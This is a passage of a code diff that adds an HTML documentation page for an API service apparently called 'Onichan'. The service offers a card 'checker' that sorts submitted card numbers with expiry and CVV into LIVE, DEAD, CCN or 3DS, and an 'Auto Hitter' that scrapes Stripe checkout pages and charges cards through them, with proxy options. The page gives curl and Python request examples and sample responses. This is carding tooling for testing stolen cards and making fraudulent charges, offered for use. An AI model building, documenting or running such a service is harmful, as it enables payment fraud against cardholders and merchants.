+        <pre><code>curl -X POST <span class="str">""" + base + r"""/v1/check"</span> \
+     -H <span class="str">"X-API-Key: YOUR_KEY"</span> \
+     -H <span class="str">"Content-Type: application/json"</span> \
+     -d <span class="str">'{"card":"4111111111111111|12|2026|123","gate":"se1"}'</span></code></pre>
+      </div>
+      <h3 class="sub-heading">Python Example</h3>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">python</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code><span class="kw">import</span> requests
+
+resp = requests.<span class="method">post</span>(
+    <span class="str">"</span>""" + base + r"""<span class="str">/v1/check"</span>,
+    headers={<span class="str">"X-API-Key"</span>: <span class="str">"oni-…"</span>},
+    json={<span class="key">"card"</span>: <span class="str">"4111111111111111|12|2026|123"</span>, <span class="key">"gate"</span>: <span class="str">"se1"</span>}
+)
+data = resp.<span class="method">json</span>()
+<span class="kw">print</span>(data[<span class="str">"result"</span>][<span class="str">"status"</span>])  <span class="cm"># "LIVE", "DEAD", "CCN", …</span></code></pre>
+      </div>
+      <h3 class="sub-heading">Response</h3>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">json</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code><span class="punc">{</span>
+  <span class="key">"success"</span><span class="punc">:</span> <span class="kw">true</span><span class="punc">,</span>
+  <span class="key">"gate"</span><span class="punc">:</span> <span class="str">"se1"</span><span class="punc">,</span>
+  <span class="key">"card"</span><span class="punc">:</span> <span class="str">"4111111111111111|12|2026|123"</span><span class="punc">,</span>
+  <span class="key">"result"</span><span class="punc">: {</span>
+    <span class="key">"status"</span><span class="punc">:</span> <span class="str">"LIVE"</span><span class="punc">,</span>
+    <span class="key">"response"</span><span class="punc">:</span> <span class="str">"Your card was charged $0."</span><span class="punc">,</span>
+    <span class="key">"time"</span><span class="punc">:</span> <span class="num">1.42</span>
+  <span class="punc">}</span>
+<span class="punc">}</span></code></pre>
+      </div>
+    </div>
+
+    <!-- HITTER -->
+    <div class="doc-section" id="sec-hitter">
+      <h1 class="page-title">Auto Hitter API</h1>
+      <p>Automate Stripe checkout page hits. Two steps: fetch info, then charge.</p>
+      <h2 class="section-heading" id="hi-info">Step 1 — Fetch Checkout Info</h2>
+      <p><span class="method-badge mb-post">POST</span><span class="endpoint-path">/v1/hit/info</span></p>
+      <p>Fetches merchant, product, price, and currency from a Stripe checkout URL. Pass the result directly to the charge endpoint.</p>
+      <table class="param-table">
+        <thead><tr><th>Field</th><th>Type</th><th>Required</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td>url</td><td>string</td><td><span class="required">required</span></td><td>Stripe checkout URL (https://buy.stripe.com/… or a merchant's checkout page)</td></tr>
+          <tr><td>proxy</td><td>string</td><td><span class="optional">optional</span></td><td>Proxy string</td></tr>
+        </tbody>
+      </table>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code>curl -X POST <span class="str">""" + base + r"""/v1/hit/info"</span> \
+     -H <span class="str">"X-API-Key: YOUR_KEY"</span> \
+     -H <span class="str">"Content-Type: application/json"</span> \
+     -d <span class="str">'{"url":"https://buy.stripe.com/test_xxx"}'</span></code></pre>
+      </div>
+      <h3 class="sub-heading">Response</h3>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">json</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code><span class="punc">{</span>
+  <span class="key">"success"</span><span class="punc">:</span> <span class="kw">true</span><span class="punc">,</span>
+  <span class="key">"info"</span><span class="punc">: {</span>
+    <span class="key">"merchant"</span><span class="punc">:</span> <span class="str">"Acme Corp"</span><span class="punc">,</span>
+    <span class="key">"product"</span><span class="punc">:</span> <span class="str">"Premium Plan"</span><span class="punc">,</span>
+    <span class="key">"price"</span><span class="punc">:</span> <span class="num">9.99</span><span class="punc">,</span>
+    <span class="key">"currency"</span><span class="punc">:</span> <span class="str">"usd"</span><span class="punc">,</span>
+    <span class="key">"stripe_pk"</span><span class="punc">:</span> <span class="str">"pk_live_…"</span>
+  <span class="punc">}</span>
+<span class="punc">}</span></code></pre>
+      </div>
+      <h2 class="section-heading" id="hi-charge">Step 2 — Charge Card</h2>
+      <p><span class="method-badge mb-post">POST</span><span class="endpoint-path">/v1/hit/charge</span></p>
+      <table class="param-table">
+        <thead><tr><th>Field</th><th>Type</th><th>Required</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td>url</td><td>string</td><td><span class="required">required</span></td><td>Same checkout URL</td></tr>
+          <tr><td>card</td><td>string</td><td><span class="required">required</span></td><td>Card in <code>cc|mm|yy|cvv</code> format</td></tr>
+          <tr><td>checkout_data</td><td>object</td><td><span class="optional">optional</span></td><td>Pass the <code>info</code> object from Step 1 to skip a second fetch</td></tr>
+          <tr><td>email</td><td>string</td><td><span class="optional">optional</span></td><td>Billing email</td></tr>
+          <tr><td>proxy</td><td>string</td><td><span class="optional">optional</span></td><td>Proxy string</td></tr>
+        </tbody>
+      </table>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">python</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code><span class="kw">import</span> requests
+
+BASE = <span class="str">"</span>""" + base + r"""<span class="str">"</span>
+KEY  = <span class="str">"oni-…"</span>
+HDRS = {<span class="str">"X-API-Key"</span>: KEY, <span class="str">"Content-Type"</span>: <span class="str">"application/json"</span>}
+URL  = <span class="str">"https://buy.stripe.com/test_xxx"</span>
+
+<span class="cm"># Step 1 — get checkout info</span>
+info = requests.<span class="method">post</span>(f<span class="str">"{BASE}/v1/hit/info"</span>, json={<span class="str">"url"</span>: URL}, headers=HDRS).<span class="method">json</span>()[<span class="str">"info"</span>]
+
+<span class="cm"># Step 2 — charge</span>
+result = requests.<span class="method">post</span>(f<span class="str">"{BASE}/v1/hit/charge"</span>, headers=HDRS, json={
+    <span class="key">"url"</span>: URL,
+    <span class="key">"card"</span>: <span class="str">"4111111111111111|12|2026|123"</span>,
+    <span class="key">"checkout_data"</span>: info
+}).<span class="method">json</span>()
+<span class="kw">print</span>(result[<span class="str">"result"</span>][<span class="str">"status"</span>])</code></pre>
+      </div>
+      <h3 class="sub-heading">Response</h3>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">json</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code><span class="punc">{</span>
+  <span class="key">"success"</span><span class="punc">:</span> <span class="kw">true</span><span class="punc">,</span>
+  <span class="key">"result"</span><span class="punc">: {</span>
+    <span class="key">"status"</span><span class="punc">:</span> <span class="str">"CHARGED"</span><span class="punc">,</span>
+    <span class="key">"response"</span><span class="punc">:</span> <span class="str">"Payment succeeded"</span><span class="punc">,</span>
+    <span class="key">"merchant"</span><span class="punc">:</span> <span class="str">"Acme Corp"</span><span class="punc">,</span>
+    <span class="key">"amount"</span><span class="punc">:</span> <span class="str">"9.99 usd"</span>
+  <span class="punc">}</span>
+<span class="punc">}</span></code></pre>
+      </div>
+    </div>
+
+    <!-- STATUS CODES -->
+    <div class="doc-section" id="sec-statuses">
+      <h1 class="page-title">Status Codes</h1>
+      <p>The <code>result.status</code> field in checker/hitter responses:</p>
+      <table class="param-table">
+        <thead><tr><th>Status</th><th>Meaning</th></tr></thead>
+        <tbody>
+          <tr><td><span class="chip chip-live">LIVE</span> / <span class="chip chip-live">CHARGED</span></td><td>Card is valid and was successfully processed</td></tr>
+          <tr><td><span class="chip chip-dead">DEAD</span></td><td>Card is declined / invalid</td></tr>
+          <tr><td><span class="chip chip-ccn">CCN</span></td><td>Card number invalid — wrong number or BIN</td></tr>
+          <tr><td><span class="chip chip-ccn">3DS</span></td><td>3D-Secure required — card blocked without browser auth</td></tr>
+          <tr><td><span class="chip chip-dead">ERROR</span></td><td>Internal or network error during checking</td></tr>
+        </tbody>
+      </table>
+      <h2 class="section-heading" id="sc-http">HTTP Status Codes</h2>
+      <table class="param-table">
+        <thead><tr><th>HTTP</th><th>Meaning</th></tr></thead>
+        <tbody>
+          <tr><td>200</td><td>Request succeeded</td></tr>
+          <tr><td>400</td><td>Bad request — missing or malformed parameters</td></tr>
+          <tr><td>401</td><td>Unauthorized — invalid or missing API key</td></tr>
+          <tr><td>500</td><td>Internal error — gate/hitter failed unexpectedly</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- ERRORS -->
+    <div class="doc-section" id="sec-errors">
+      <h1 class="page-title">Error Handling</h1>
+      <p>All error responses return JSON with an <code>error</code> field and sometimes a <code>message</code> or <code>hint</code> field.</p>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">json — 401 Unauthorized</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code><span class="punc">{</span>
+  <span class="key">"error"</span><span class="punc">:</span> <span class="str">"Unauthorized"</span><span class="punc">,</span>
+  <span class="key">"message"</span><span class="punc">:</span> <span class="str">"Missing or invalid API key. Pass it as X-API-Key header."</span>
+<span class="punc">}</span></code></pre>
+      </div>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">json — 400 Bad Request</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code><span class="punc">{</span>
+  <span class="key">"error"</span><span class="punc">:</span> <span class="str">"Unknown gate: xyz"</span><span class="punc">,</span>
+  <span class="key">"hint"</span><span class="punc">:</span> <span class="str">"GET /v1/gates for valid IDs"</span>
+<span class="punc">}</span></code></pre>
+      </div>
+      <div class="callout tip">
+        <span class="callout-icon">💡</span>
+        <p>Always check both the HTTP status code and the <code>error</code> field. The <code>success</code> field is only present on 200 responses.</p>
+      </div>
+    </div>
+
+  </article>
+
+  <!-- Table of Contents -->
+  <aside class="toc-wrap">
+    <nav class="toc" id="toc">
+      <div class="toc-title">On this page</div>
+      <!-- filled by JS -->
+    </nav>
+  </aside>
+</div>
+</div>
+
+<button class="theme-btn" id="theme-btn" title="Toggle theme" onclick="toggleTheme()">🌙</button>
+
+<script>
+var currentSec = 'welcome';
+
+var tocMap = {
+  welcome:  [{id:'wh-what',t:'What Onichan Does'},{id:'wh-quick',t:'Quick Links'}],
+  start:    [{id:'gs-1',t:'1 — Get an API Key'},{id:'gs-2',t:'2 — List Gates'},{id:'gs-3',t:'3 — Check a Card'}],
+  auth:     [{id:'au-header',t:'Header'},{id:'au-query',t:'Query Param'},{id:'au-body',t:'Body'},{id:'au-manage',t:'Managing Keys'}],
+  gates:    [{id:'ga-list',t:'List Gates'}],
+  checker:  [{id:'ch-ep',t:'Endpoint'}],
+  hitter:   [{id:'hi-info',t:'Fetch Checkout Info'},{id:'hi-charge',t:'Charge Card'}],
+  statuses: [{id:'sc-http',t:'HTTP Status Codes'}],
+  errors:   []
+};
+
+function showSec(id){
+  document.querySelectorAll('.doc-section').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('.sidebar-link[data-sec]').forEach(a=>a.classList.remove('active'));
+  document.getElementById('sec-'+id).classList.add('active');
+  document.querySelector('.sidebar-link[data-sec="'+id+'"]').classList.add('active');
+  currentSec = id;
+  buildToc(id);
+  window.scrollTo(0,0);
+  document.querySelector('.main').scrollTo(0,0);
+}
+
+function buildToc(id){
+  var toc = document.getElementById('toc');
+  var items = tocMap[id] || [];
+  if(!items.length){toc.innerHTML='<div class="toc-title">On this page</div><span style="color:var(--muted);font-size:.8rem">—</span>';return;}
+  var html='<div class="toc-title">On this page</div>';
+  items.forEach(function(it){html+='<a href="#'+it.id+'" onclick="scrollTo(\''+it.id+'\')">'+it.t+'</a>';});
+  toc.innerHTML=html;
+}
+
+function scrollTo(id){
+  var el=document.getElementById(id);
+  if(el){el.scrollIntoView({behavior:'smooth',block:'start'});}
+  return false;
+}
+
+function copyBlock(btn){
+  var code=btn.closest('.code-wrap').querySelector('code').innerText;
+  navigator.clipboard.writeText(code).then(function(){
+    var orig=btn.textContent;btn.textContent='✅ Copied!';
+    setTimeout(function(){btn.textContent=orig;},2000);
+  });
+}
+
+function filterNav(q){
+  q=q.toLowerCase();
+  document.querySelectorAll('.sidebar-link[data-sec]').forEach(function(a){
+    a.style.display=(!q||a.textContent.toLowerCase().includes(q))?'':'none';
+  });
+}
+
+function toggleTheme(){
+  var html=document.documentElement;
+  var isDark=html.getAttribute('data-theme')==='dark';
+  html.setAttribute('data-theme',isDark?'light':'dark');
+  document.getElementById('theme-btn').textContent=isDark?'☀️':'🌙';
+}
+
+buildToc('welcome');
+</script>
+</body>
+</html>
+""")
 
 
 def run():
